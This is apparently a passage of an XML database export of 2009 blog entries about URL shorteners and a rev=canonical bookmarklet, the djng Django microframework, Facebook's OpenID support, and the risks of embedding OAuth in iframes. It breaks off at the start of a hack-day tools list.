	&lt;li&gt;Digital Urbanites: How To Become Part of the New Social Capital&lt;/li&gt;
	&lt;li&gt;The Future Of Social Networks&lt;/li&gt;
	&lt;li&gt;How Social Networks Are Killing the Revolution&lt;/li&gt;
	&lt;li&gt;Making Whuffie: Raising Social Capital in Online Communities&lt;/li&gt;
	&lt;li&gt;The Mix at Six Hosted by Social Media Group&lt;/li&gt;
	&lt;li&gt;Mobile Social SXSW BBQ&lt;/li&gt;
	&lt;li&gt;My Boss Doesn't Get It: Championing Social Media to the Man&lt;/li&gt;
	&lt;li&gt;PBS' Interactive Social Media &amp;amp; Online Video Studio&lt;/li&gt;
	&lt;li&gt;The Search for a More Social Web&lt;/li&gt;
	&lt;li&gt;Security for the Social Set&lt;/li&gt;
	&lt;li&gt;Social Engineering: Scam Your Way Into Anything or From Anybody&lt;/li&gt;
	&lt;li&gt;Social Gamers: Away From the Keyboard&lt;/li&gt;
	&lt;li&gt;Social Media For Social Good&lt;/li&gt;
	&lt;li&gt;Social Media Marketing&lt;/li&gt;
	&lt;li&gt;Social Media Marketing: An Hour a Day&lt;/li&gt;
	&lt;li&gt;Social Media Nonprofit ROI Poetry Slam&lt;/li&gt;
	&lt;li&gt;Social Media: If You Liked it, Then You Should Have Put a Digg on it...&lt;/li&gt;
	&lt;li&gt;Social Networking in Health: e-Patients, Data &amp;amp; Privacy&lt;/li&gt;
	&lt;li&gt;Social Patterns and Antipatterns For the Win&lt;/li&gt;
	&lt;li&gt;Suxorz '09: The Ten Worst Social Media Campaigns&lt;/li&gt;
	&lt;li&gt;Twitter for Marketers: Is It Still Social Media?&lt;/li&gt;
	&lt;li&gt;Using GPS &amp;amp; Location to Enhance Social Networking&lt;/li&gt;
	&lt;li&gt;Using the New Digital Social Media to Accelerate Sustainability&lt;/li&gt;
&lt;/ul&gt;
</field>
		<field name="created">2009-03-14 23:02:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1586</field>
		<field name="title">rev=canonical bookmarklet and designing shorter URLs</field>
		<field name="slug">revcanonical</field>
		<field name="body">&lt;p&gt;I've watched the proliferation of URL shortening services over the past year with a certain amount of dismay. I care about the health of the web and try to ensure that URLs I am responsible will last for as long as possible, and I think it's very unlikely that all of these new services will still be around in twenty years time. Last month &lt;a href=&quot;http://simonwillison.net/2009/Mar/8/twitter/&quot;&gt;I suggested&lt;/a&gt; that the Internet Archive start mirroring redirect databases, and last week I was &lt;a href=&quot;http://simonwillison.net/2009/Apr/3/tinyurl/&quot;&gt;pleased to hear&lt;/a&gt; that Archiveteam, a different organisation, had &lt;a href=&quot;http://archiveteam.org/index.php?title=TinyURL&quot;&gt;already started crawling&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The most recent discussion was kicked off by &lt;a href=&quot;http://joshua.schachter.org/2009/04/on-url-shorteners.html&quot;&gt;Joshua Schachter&lt;/a&gt; and &lt;a href=&quot;http://www.scripting.com/stories/2009/03/07/solvingTheTinyurlCentraliz.html&quot;&gt;Dave Winer&lt;/a&gt;, and &lt;a href=&quot;http://laughingmeme.org/2009/04/03/url-shortening-hinting/&quot; title=&quot;URL Shortening Hinting&quot;&gt;a solution has emerged&lt;/a&gt; driven by some lightning fast hacking by Kellan Elliott-McCrea. The idea is simple: sites get to chose their preferred source of shortened URLs (including self-hosted solutions) and specify it from individual pages using &lt;code&gt;&amp;lt;link rev=&quot;canonical&quot; href=&quot;... shorter URL here ...&quot;&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;By hosting their own shorteners, the reliability should match that of the host site - and the amount of damage caused by a major shortener going missing can be dramatically reduced.&lt;/p&gt;

&lt;p&gt;I've been experimenting with this new pattern today. Here are a few small contributions to the wider discussion.&lt;/p&gt;

&lt;h4&gt;A URL shortening bookmarklet&lt;/h4&gt;

&lt;p&gt;Kellan's &lt;a href=&quot;http://revcanonical.appspot.com/&quot;&gt;rev=canonical service&lt;/a&gt; exposes rev=canonical links using a server-side script running on App Engine. An obvious next step is to distil that logic in to a bookmarklet. I decided to combine the rev=canonical logic with my &lt;a href=&quot;http://simonwillison.net/2008/Aug/27/jsontinyurl/&quot;&gt;json-tinyurl&lt;/a&gt; web service (also on App Engine), which allows browsers to lookup or create TinyURLs using a cross-domain JSONP request. The resulting bookmarklet will display the site's rev=canonical link if it exists, or create and display a TinyURL link otherwise:&lt;/p&gt;

&lt;p&gt;Bookmarklet: &lt;a href=&quot;javascript:(function(){var url=document.location;var links=document.getElementsByTagName('link');var found=0;for(var i = 0, l; l = links[i]; i++){if(l.getAttribute('rev')=='canonical'||(/alternateshort/).exec(l.getAttribute('rel'))) {found=l.getAttribute('href');break;}}if (!found) {for (var i = 0; l = document.links[i]; i++) {if (l.getAttribute('rev') == 'canonical') {found = l.getAttribute('href');break;}}}if (found) {prompt('URL:', found);} else {window.onTinyUrlGot = function(r) {if (r.ok) {prompt('URL:', r.tinyurl);} else {alert('Could not shorten with tinyurl');}};var s = document.createElement('script');s.type='text/javascript';s.src='http://json-tinyurl.appspot.com/?callback=onTinyUrlGot&amp;amp;url=' +document.location;document.getElementsByTagName('head')[0].appendChild(s);}})();&quot;&gt;Shorten&lt;/a&gt; (drag to your browser toolbar)&lt;/p&gt;

&lt;p&gt;You can also grab the &lt;a href=&quot;http://gist.github.com/93591&quot;&gt;uncompressed source code&lt;/a&gt;.&lt;/p&gt;

&lt;h4&gt;Designing short URLs&lt;/h4&gt;

&lt;p&gt;I've also implemented rev=canonical on this site. I ended up buying a new domain for this, since simonwillison.net is both difficult to spell and 17 characters long. I ended up going with swtiny.eu - 9 characters, and keeping tiny in the domain helps people guess the nature of the site from just the URLs it generates. Be warned: the DNS doesn't appear to have finished resolving yet.&lt;/p&gt;

&lt;p&gt;For the path component, I turned to a variant of base 62 encoding. Decimal integers are represented using 10 digits (0-9), but base 62 uses those digits plus the letters of the alphabet in both lower and upper case. A 13 character integer such as 7250397214971 compresses down to just 8 characters (CDeIPpOD) using base62. My &lt;a href=&quot;http://www.djangosnippets.org/snippets/1431/&quot;&gt;baseconv.py module&lt;/a&gt; implements base62, among others. I considered using base 57 by excluding o, O, 0, 1 and l as being too easily confused but decided against it.&lt;/p&gt;

&lt;p&gt;This site has three key types of content: entries, blogmarks and quotations. Each one is a separate Django model, and hence each has its own underlying database table and individual ID sequence. Since the IDs overlap, I need a way of separating out the shortened URLs for each content type.&lt;/p&gt;

&lt;p&gt;I decided to spend a byte on namespacing my shortened URLs. A prefix of E means an entry, Q means a quotation and B means a blogmark. For example:&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;&lt;samp&gt;http://swtiny.eu/EZ8&lt;/samp&gt;: Entry with ID 1584&lt;/li&gt;
    &lt;li&gt;&lt;samp&gt;http://swtiny.eu/BBEQ&lt;/samp&gt;: Blogmark with ID 4108&lt;/li&gt;
    &lt;li&gt;&lt;samp&gt;http://swtiny.eu/QE5&lt;/samp&gt;: Quotation with ID 279&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;By using upper case letters for the prefixes, I can later define custom paths starting with a lower case letter. I also have another 23 upper case prefix letters reserved in case I need them.&lt;/p&gt;

&lt;p&gt;I &lt;a href=&quot;http://twitter.com/simonw/status/1496864191&quot;&gt;asked on Twitter&lt;/a&gt; and consensus opinion was that a 301 permanent redirect was the right thing to do (as opposed to a 302), both for SEO reasons and because the content will never exist at the shorter URL.&lt;/p&gt;

&lt;h4&gt;Implementation using Django and nginx&lt;/h4&gt;

&lt;p&gt;I run all of my Django sites using Apache and &lt;a href=&quot;http://code.google.com/p/modwsgi/&quot;&gt;mod_wsgi&lt;/a&gt;, proxied behind &lt;a href=&quot;http://nginx.net/&quot;&gt;nginx&lt;/a&gt;. Each site gets an Apache running on a high port, and nginx deals with virtual host configuration (proxying each domain to a different Apache backend) and static file serving. I didn't want to set up a full Django site just to run swtiny.eu, especially since my existing blog engine was required in order to resolve the shortened URLs.&lt;/p&gt;

&lt;p&gt;Instead, I implemented the shortened URL direction as just another view within my existing site: &lt;samp&gt;http://simonwillison.net/shorter/EZ8&lt;/samp&gt;. I then configured nginx to invisibly requests to &lt;samp&gt;swtiny.eu&lt;/samp&gt; through to that URL. The correct incantation took a while to figure out, so here's the relevant section of my nginx.conf:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;nginx-conf&quot;&gt;server {
    listen 80;
    server_name www.swtiny.eu swtiny.eu;
    location / {
        rewrite (.*) /shorter$1 break;
        proxy_pass http://simonwillison.net;
        proxy_redirect off;
    }
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;proxy_redirect off&lt;/code&gt; is needed to prevent nginx from replacing &lt;samp&gt;simonwillison.net&lt;/samp&gt; in the resulting location header with &lt;samp&gt;swtiny.eu&lt;/samp&gt;. My Django view code is relatively shonky, but if you're interested you can &lt;a href=&quot;http://www.djangosnippets.org/snippets/1430/&quot;&gt;find it here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The nice thing about this approach is that it makes it trivial to add custom URL shortening domains to other projects - a quick view function and a few lines of nginx configuration are all that is needed.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; The bookmarklet now supports the rev attribute on A elements as well - &lt;a href=&quot;http://simonwillison.net/2009/Apr/11/revcanonical/#c44088&quot;&gt;thanks for the suggestion&lt;/a&gt;, Jeremy.&lt;/p&gt;</field>
		<field name="created">2009-04-11 17:37:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1587</field>
		<field name="title">djng - a Django powered microframework</field>
		<field name="slug">djng</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://github.com/simonw/djng&quot;&gt;djng&lt;/a&gt; is nearly two weeks old now, so it's about time I wrote a bit about the project.&lt;/p&gt;

&lt;p&gt;I presented a keynote at EuroDjangoCon in Prague earlier this month entitled &lt;a href=&quot;http://simonwillison.net/2009/talks/eurodjangocon-heresies/&quot;&gt;Django Heresies&lt;/a&gt;. The talk followed the noble DjangoCon tradition (established last year with the help of Mark Ramm and Cal Henderson) of pointing a spotlight at Django's flaws. In my case, it was a chance to apply the benefit of hindsight to some of the design decisions I helped make back at the Lawrence Journal-World in 2004.&lt;/p&gt;

&lt;p&gt;I took a few cheap shots at things like the &lt;code class=&quot;django&quot;&gt;{% endifequal %}&lt;/code&gt; tag and error silencing in the template system, but the three substantial topics in my talk were class-based generic views (I'm a fan), my hatred of settings.py and my interest in &lt;a href=&quot;http://en.wikipedia.org/wiki/Turtles_all_the_way_down&quot;&gt;turtles all the way down&lt;/a&gt;.&lt;/p&gt;

&lt;h4&gt;Why I hate settings.py&lt;/h4&gt;

&lt;p&gt;In the talk, I justified my dislike for settings.py by revisiting the problems behind PHP's magic quotes feature (finally going away for good in PHP 6). Magic quotes were one of the main reasons I switched to Python from PHP.&lt;/p&gt;

&lt;p&gt;My main problem with magic quotes was that they made it extremely difficult to write reusable PHP code. The feature was configured globally, which lead to a quandary. What if you have two libraries, one expecting magic quotes on and the other expecting it off? Your library could check &lt;code class=&quot;php&quot;&gt;get_magic_quotes_gpc()&lt;/code&gt; and &lt;code class=&quot;php&quot;&gt;stripslashes()&lt;/code&gt; from input if the setting was turned on, but this would break in the presence of the common idiom where &lt;code class=&quot;php&quot;&gt;stripslashes()&lt;/code&gt; is applied to all incoming &lt;code class=&quot;php&quot;&gt;$_GET&lt;/code&gt; and &lt;code class=&quot;php&quot;&gt;$_POST&lt;/code&gt; data.&lt;/p&gt;

&lt;p&gt;Unfortunately, global settings configured using settings.py have a similar smell to them. Middleware and context processors are the best example here - a specific setting might be needed by just one installed application, but the effects are felt by everything in the system. While I haven't yet seen two &quot;reusable&quot; Django apps that require conflicting settings, per-application settings are an obvious use case that settings.py fails to cover.&lt;/p&gt;

&lt;p&gt;Global impact aside, my bigger problem with settings.py is that I almost always end up wanting to &lt;em&gt;reconfigure them at run-time&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is possible in Django today, but comes at a price:&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;Only some settings can actually be changed at run-time - others (such as USE_I18N) are lazily evaluated once and irreversibly reconfigure parts of Django's plumbing. Figuring out which ones can be changed requires exploration of Django's source code.&lt;/li&gt;
    &lt;li&gt;If you change a setting, you need to reliably change it back at the end of a request or your application will behave strangely. Uncaught exceptions could cause problems here, unless you remember to wrap dynamic setting changes in a try/finally block.&lt;/li&gt;
    &lt;li&gt;Changing a setting isn't thread-safe (without doing some extra work).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Almost every setting in Django has legitimate use-cases for modification at run-time. Here are just a few examples:&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;Requests from mobile phones may need a different TEMPLATE_DIRS setting, to load the mobile-specific templates in preference to the site defaults.&lt;/li&gt;
    &lt;li&gt;Some sites offer premium accounts which in turn gain access to more reliable servers. Premium users might get to send e-mail via a separate pool of SMTP servers, for example.&lt;/li&gt;
    &lt;li&gt;Some sections of code may want to use a different cache backend, or talk to a different set of memcache servers - to reduce the chance of one rapidly changing component causing other component's cache entries to expire too early.&lt;/li&gt;
    &lt;li&gt;Errors in one area of a site might need to be sent to a different team of developers.&lt;/li&gt;
    &lt;li&gt;Admin users might want DEBUG=True, while regular site visitors get DEBUG=False.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Finally, settings.py is behind the dreaded &quot;Settings cannot be imported, because environment variable DJANGO_SETTINGS_MODULE is undefined&quot; exception. Yuck.&lt;/p&gt;

&lt;h4&gt;Turtles all the way down&lt;/h4&gt;

&lt;p&gt;The final section of the talk was about turtles. More precisely, it was about their role as an &quot;infinite regression belief about cosmology and the nature of the universe&quot;. I want to apply that idea to Django.&lt;/p&gt;

&lt;p&gt;My favourite thing about Django is something I've started to call the &quot;Django Contract&quot;: the idea that a Django view is a callable which takes a request object and returns a response object. I want to expand that concept to other parts of Django as well:&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;URLconf: takes a request, dispatches based on &lt;code&gt;request.path&lt;/code&gt;, returns a response.&lt;/li&gt;
    &lt;li&gt;Application: takes a request, returns a response&lt;/li&gt;
    &lt;li&gt;Middleware: takes a request, returns a response (conditionally transforming either)&lt;/li&gt;
    &lt;li&gt;Django-powered site: hooked in to mod_wsgi/FastCGI/a Python web server, takes a request, returns a response&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So instead of a Django site consisting of a settings.py, urls.py and various applications and middlewares, a site would just be a callable that obeys the Django Contract and composes together dozens of other callables.&lt;/p&gt;

&lt;p&gt;At this point, Django starts to look a lot like WSGI. What if WSGI and the Django Contract were interchangeable? WSGI is a wrapper around HTTP, so what if that could be swapped in and out (through proxies) as well? Django, WSGI and HTTP, three breeds of turtle arranged on top of each other in various configurations. Turtles all the way down.&lt;/p&gt;

&lt;h4&gt;djng&lt;/h4&gt;

&lt;p&gt;djng is my experiment to see what Django would like without settings.py and with a whole lot more turtles. It's Yet Another Python Microframework.&lt;/p&gt;

&lt;p&gt;What's a microframework? The best examples are probably &lt;a href=&quot;http://webpy.org/&quot;&gt;web.py&lt;/a&gt; (itself a result of Aaron Swartz's frustrations with Django) and &lt;a href=&quot;http://www.sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt;, my all time favourite example of Ruby DSL design. More recent examples in Python include &lt;a href=&quot;http://github.com/breily/juno&quot;&gt;juno&lt;/a&gt;, &lt;a href=&quot;http://github.com/JaredKuolt/newf&quot;&gt;newf&lt;/a&gt;, &lt;a href=&quot;http://github.com/bradleywright/mnml&quot;&gt;mnml&lt;/a&gt; and &lt;a href=&quot;http://github.com/toastdriven/itty&quot;&gt;itty&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Microframeworks let you build an entire web application in a single file, usually with only one import statement. They are becoming increasingly popular for building small, self-contained applications that perform only one task - Service Oriented Architecture reborn as a combination of the Unix development philosophy and RESTful API design. I first saw this idea expressed in code by &lt;a href=&quot;http://thraxil.org/users/anders/posts/2005/12/12/tasty/&quot;&gt;Anders Pearson&lt;/a&gt; and &lt;a href=&quot;http://blog.ianbicking.org/little-apps-instead-of-little-frameworks.html&quot;&gt;Ian Bicking&lt;/a&gt; back in 2005.&lt;/p&gt;

&lt;p&gt;Unlike most microframeworks, djng has a pretty big dependency: Django itself. The plan is to reuse everything I like about Django (the templates, the ORM, view functions, the form library etc) while replacing just the top level plumbing and removing the requirement for separate settings.py and urls.py files.&lt;/p&gt;

&lt;p&gt;This is what &quot;Hello, world&quot; looks like in in djng:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;import djng

def index(request):
    return djng.Response('Hello, world')

if __name__ == '__main__':
    djng.serve(index, '0.0.0.0', 8888)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code class=&quot;python&quot;&gt;djng.Response&lt;/code&gt; is an alias for Django's &lt;code class=&quot;python&quot;&gt;HttpResponse&lt;/code&gt;. &lt;code class=&quot;python&quot;&gt;djng.serve&lt;/code&gt; is a utility function which converts up anything fulfilling the Django Contract in to a WSGI application, then exposes it over HTTP.&lt;/p&gt;

&lt;p&gt;Let's add URL routing to the example:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;app = djng.Router(
    (r'^hello$', lambda request: djng.Response('Hello, world')),
    (r'^goodbye$', lambda request: djng.Response('Goodbye, world')),
)

if __name__ == '__main__':
    djng.serve(app, '0.0.0.0', 8888)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The implementation of djng.Router is just &lt;a href=&quot;http://github.com/simonw/djng/blob/c892dddf064d5542c17119d02920ea4f5e9dd7f5/djng/router.py&quot;&gt;a few lines of glue code&lt;/a&gt; adding a nicer API to Django's internal RegexURLResolver class.&lt;/p&gt;

&lt;h4&gt;Services, not settings&lt;/h4&gt;

&lt;p&gt;The trickiest problem I still need to solve is how to replace settings.py. A group of developers (including &lt;a href=&quot;http://www.holovaty.com/&quot;&gt;Adrian&lt;/a&gt;, &lt;a href=&quot;http://lucumr.pocoo.org/&quot;&gt;Armin&lt;/a&gt;, &lt;a href=&quot;http://lazypython.blogspot.com/&quot;&gt;Alex&lt;/a&gt; and myself) had an excellent brainstorming session at EuroDjangoCon about this. We realised that most of the stuff in settings.py can be recast as configuring &lt;em&gt;services&lt;/em&gt; which Django makes available to the applications it is hosting. Services like the following:&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;Caching&lt;/li&gt;
    &lt;li&gt;Templating&lt;/li&gt;
    &lt;li&gt;Sending e-mail&lt;/li&gt;
    &lt;li&gt;Sessions&lt;/li&gt;
    &lt;li&gt;Database connection - &lt;code&gt;django.db.connection&lt;/code&gt;&lt;/li&gt;
    &lt;li&gt;Higher level ORM&lt;/li&gt;
    &lt;li&gt;File storage&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each of the above needs to be configured, and each also might need to be reconfigured at runtime. Django already points in this direction by providing hooks for adding custom backends for caching, template loading, file storage and session support. What's missing is an official way of swapping in different backends at runtime.&lt;/p&gt;

&lt;p&gt;I'm currently leaning towards the idea of a &quot;stack&quot; of service implementations, one for each of the service categories listed above. A new implementation could be pushed on to the stack at any time during the Django request/response cycle, and will be automatically popped back off again before the next request is processed (all in a thread-safe manner). Applications would also be able to instantiate and use a particular service implementation directly should they need to do so.&lt;/p&gt;

&lt;p&gt;A few days ago I heard about &lt;a href=&quot;http://pypi.python.org/pypi/Contextual&quot;&gt;Contextual&lt;/a&gt;, which appears to be trying to solve a similar problem. Just a few minutes ago I stumbled across &lt;a href=&quot;http://pythonpaste.org/modules/registry.html&quot;&gt;paste.registry's StackedObjectProxy&lt;/a&gt; which seems to be exactly what I've been busily reinventing.&lt;/p&gt;

&lt;p&gt;My current rough thoughts on an API for this can be found in &lt;a href=&quot;http://github.com/simonw/djng/blob/c892dddf064d5542c17119d02920ea4f5e9dd7f5/services_api_ideas.txt&quot;&gt;services_api_ideas.txt&lt;/a&gt;. I'm eager to hear suggestions on how to tackle this problem.&lt;/p&gt;

&lt;p&gt;djng is very much an experiment at the moment - I wouldn't suggest building anything against it unless you're willing to maintain your own fork. That said, the code is all on GitHub partly because I want people to fork it and experiment with their own API concepts as much as possible.&lt;/p&gt;

&lt;p&gt;If you're interested in exploring these concepts with me, please join me on the brand new &lt;a href=&quot;http://groups.google.com/group/djng&quot;&gt;djng mailing list&lt;/a&gt;.&lt;/p&gt;
</field>
		<field name="created">2009-05-19 00:13:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1588</field>
		<field name="title">Facebook Usernames and OpenID</field>
		<field name="slug">thefacebookdebacle</field>
		<field name="body">&lt;p&gt;Today's launch of &lt;a href=&quot;http://search.twitter.com/search?q=%23fufacebook&quot;&gt;Facebook Usernames&lt;/a&gt; provides an obvious and exciting opportunity for Facebook to become an OpenID provider. Facebook have clearly demonstrated their interest in becoming the key online identity for their users, and the new usernames feature is their acknowledgement that URL-based identities are an important component of that, no doubt driven in part by Twitter making usernames trendy again.&lt;/p&gt;

&lt;p&gt;It's interesting to consider Facebook's history with regards to OpenID and single sign on in general. When I started publicly advocating for OpenID &lt;a href=&quot;http://simonwillison.net/2007/talks/&quot;&gt;back in 2007&lt;/a&gt;, my primary worry was that someone would solve the SSO problem in a proprietary way, irreparably damaging the decentralised nature of the Web - just as Microsoft had attempted a few years earlier with Passport.&lt;/p&gt;

&lt;p&gt;When Facebook Connect was announced &lt;a href=&quot;http://blog.facebook.com/blog.php?post=24577977130&quot;&gt;a year ago&lt;/a&gt; it seemed like my worst fears had become realised. Facebook Connect's user experience was a huge improvement over OpenID - with only one provider, the sign in UI could be reduced to a single button. Their use of a popup window for the sign in flow was inspired - various usability studies have since shown that users are much more likely to complete a SSO flow if they can see the site they are signing in to in a background window.&lt;/p&gt;

&lt;p&gt;Thankfully, Facebook seem to understand that the industry isn't willing to accept a single SSO provider, no matter how smooth their implementation. Mark Zuckerberg made reassuring noises about OpenID support at both &lt;a href=&quot;http://news.cnet.com/8301-13577_3-10063328-36.html&quot;&gt;FOWA 2008&lt;/a&gt; and &lt;a href=&quot;http://www.readwriteweb.com/archives/mark_zuckerberg_on_data_portab.php&quot;&gt;SxSW 2009&lt;/a&gt;, but things really stepped up earlier this year when &lt;a href=&quot;http://openid.net/2009/02/05/facebook-joins-openid-foundation-board/&quot;&gt;Facebook joined the OpenID Foundation Board&lt;/a&gt; (accompanied by a substantial financial donation). Facebook's board representative, &lt;a href=&quot;http://www.sociallipstick.com/&quot;&gt;Luke Shepherd&lt;/a&gt;, is an excellent addition and brings a refreshingly user-centric approach to OpenID. Luke was previously responsible for much of the work on Facebook Connect and has been advocating OpenID inside Facebook for a long time.&lt;/p&gt;

&lt;p&gt;Facebook may not have committed to becoming a provider yet (at least not in public), but their decision to become a consumer first is another interesting data point. They may be trying to avoid the common criticism thrown at companies who provide but don't consume - if they're not willing to eat their own dog food, why should anyone else?&lt;/p&gt;

&lt;p&gt;At any rate, their consumer implementation is fascinating. It's live right now, even though there's no OpenID login box anywhere to be seen on the site. Instead, Facebook take advantage of the little known &lt;a href=&quot;http://openid.net/specs/openid-authentication-2_0.html#anchor28&quot;&gt;checkid_immediate mode&lt;/a&gt;. Once you've associated your OpenID with your Facebook account (using the &quot;Linked Accounts&quot; section of the settings pane) Facebook sets a cookie remembering your OpenID provider, which persists even after you log out of Facebook. When you later visit the Facebook homepage, a checkid_immediate request is silently sent to your provider, logging you in automatically if you are already authenticated there.&lt;/p&gt;

&lt;p&gt;While it's great to see innovation with OpenID at such a large scale, I'm not at all convinced that they've got this right. The feature is virtually invisible to users (it took me a bunch of research to figure out how to use it) and not at all intuitive - if I've logged out of Facebook, how come visiting the home page logs me straight back in again? I guess this is why Luke is keen on &lt;a href=&quot;http://www.sociallipstick.com/2009/05/logout-the-other-half-of-the-identity-equation/&quot;&gt;exploring single sign out with OpenID&lt;/a&gt;. It sounds like the current OpenID consumer support is principally intended as a developer preview, and I'm looking forward to seeing how they change it based on ongoing user research.&lt;/p&gt;

&lt;p&gt;As OpenID provider implementation is an obvious next step that can't be that far off - I wouldn't be surprised to hear an announcement within a month or two.&lt;/p&gt;

&lt;h3&gt;HTTP redirect codes&lt;/h3&gt;

&lt;p&gt;As an aside, I decided to check that Facebook were using the correct 3xx HTTP status code to redirect from &lt;a href=&quot;http://www.facebook.com/profile.php?id=666590500&quot;&gt;my old profile page&lt;/a&gt; to &lt;a href=&quot;http://www.facebook.com/swillison&quot;&gt;my new one&lt;/a&gt;. I was horrified to discover that they are using a 200 code, followed by &lt;a href=&quot;http://gist.github.com/129240&quot;&gt;a chunk of JavaScript&lt;/a&gt; to implement the redirect! The situation for logged out users is better but still fundamentally flawed: if you enable your public search listing (using an option tucked away on &lt;a href=&quot;http://www.facebook.com/privacy/?view=search&quot;&gt;www.facebook.com/privacy/?view=search&lt;/a&gt;) and &lt;samp&gt;curl -i&lt;/samp&gt; your old profile URL you get a 302 Found, when the correct status code is clearly a 301 Moved Permanently.&lt;/p&gt;

&lt;p&gt;One final note: it almost goes without saying, but one of the best things about OpenID is that you can register a real domain name that you can own, instead of just having another URL on Facebook.&lt;/p&gt;</field>
		<field name="created">2009-06-13 17:01:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1589</field>
		<field name="title">Teaching users to be secure is a shared responsibility</field>
		<field name="slug">responsibility</field>
		<field name="body">&lt;p&gt;Ryan Janssen: &lt;a href=&quot;http://drstarcat.com/archives/133&quot;&gt;Why an OAuth iframe is a Great Idea&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote cite=&quot;http://drstarcat.com/archives/133&quot;&gt;&lt;p&gt;The reason the OAuth community prefers that we open up a new window is that if you look at the URL in the window (the place you type in a site’s name), you would see that it says www.netflix.com* and know that you are giving your credentials to Netflix.&lt;/p&gt;

&lt;p&gt;Or would you?  I would!  Other technologists would!  But would you?  Would you even notice?  If you noticed would you care?  The answer for the VAST majority of the world is of course, no.  In fact to an average person, getting taken to an ENTIRELY other site with some weird little dialog floating in a big page is EXTREMELY suspicious.  The real site you are trusting to do the right thing is SetJam (not weird pop-up window site).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I posted a reply comment on that post, but I'll replicate it in full here:&lt;/p&gt;

&lt;blockquote cite=&quot;http://drstarcat.com/archives/133#IDComment27455126&quot;&gt;
&lt;p&gt;Please, please don't do this.&lt;/p&gt;

&lt;p&gt;As web developers we have a shared responsibility to help our users stay safe on the internet. This is becoming ever more important as people move more of their lives online.&lt;/p&gt;

&lt;p&gt;It's an almost sisyphean task. If you want to avoid online fraud, you need to understand an enormous stack of technologies: browsers, web pages, links, URLs, DNS, SSL, certificates... I know user education is never the right answer, but in the case of the Web I honestly can't see any other route.&lt;/p&gt;

&lt;p&gt;The last thing we need is developers making the problem worse by encouraging unsafe behaviour. That was the whole POINT of OAuth - the password anti-pattern was showing up everywhere, and was causing very real problems. OAuth provides an alternative, but we still have a long way to go convincing users not to hand their password over to any site that asks for it. Still, it's a small victory in a much bigger war.&lt;/p&gt;

&lt;p&gt;If developers start showing OAuth in an iframe, that victory was for nothing - we may as well not have bothered. OAuth isn't just a protocol, it's an ambitious attempt to help users understand the importance of protecting their credentials, and the fact that different sites should be granted different permissions with regards to accessing their stuff. This is a difficult but critical lesson for users to learn. The only real hope is if OAuth, implemented correctly, spreads far enough around the Web that people start to understand it and get a feel for how it is meant to work.&lt;/p&gt;

&lt;p&gt;By implementing OAuth in an iframe you are completely undermining this effort - and in doing so you're contributing to a tragedy of the commons where selfish behaviour on the behalf of a few causes problems for everyone else. Even worse, if the usability DOES prove to be better (which wouldn't be surprising) you'll be actively encouraging people to implement OAuth in an insecure way - your competitors will hardly want to keep doing things the secure way if you are getting higher conversion rates than they are.&lt;/p&gt;

&lt;p&gt;So once again, please don't do this.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I hope my argument is convincing. In case it isn't, I'd strongly suggest that any sites offering OAuth protected APIs add frame-busting JavaScript to their OAuth verification pages. Thankfully, in this case there's a technical option for protecting the commons.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; It turns out Netflix already use a frame-busting script on their OAuth authentication page.&lt;/p&gt;</field>
		<field name="created">2009-07-16 20:04:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1590</field>
		<field name="title">Hack Day tools for non-developers</field>
		<field name="slug">tools</field>
		<field name="body">&lt;p&gt;We're about to run our second internal hack day at the Guardian. The first was &lt;a href=&quot;http://www.guardian.co.uk/global/insideguardian/2008/nov/18/guardian-hack-day-results&quot; title=&quot;Results from Hack Day at the Guardian&quot;&gt;an enormous amount of fun&lt;/a&gt; and the second one looks set to be even more productive.&lt;/p&gt;

&lt;p&gt;There's only one rule at hack day: build something you can demonstrate at the end of the event (Powerpoint slides don't count). Importantly though, our hack days are not restricted to just our development team: anyone from the technology department can get involved, and we extend the invitation to other parts of the organisation as well. At the Guardian, this includes journalists.&lt;/p&gt;

&lt;p&gt;For our first hack day, I put together a list of &quot;tools for non-developers&quot; - sites, services and software that could be used for hacking without programming knowledge as a pre-requisite. I'm now updating that list with recommendations from elsewhere. Here's the list so far:&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://www.freebase.com/&quot;&gt;Freebase&lt;/a&gt;&lt;/h4&gt;

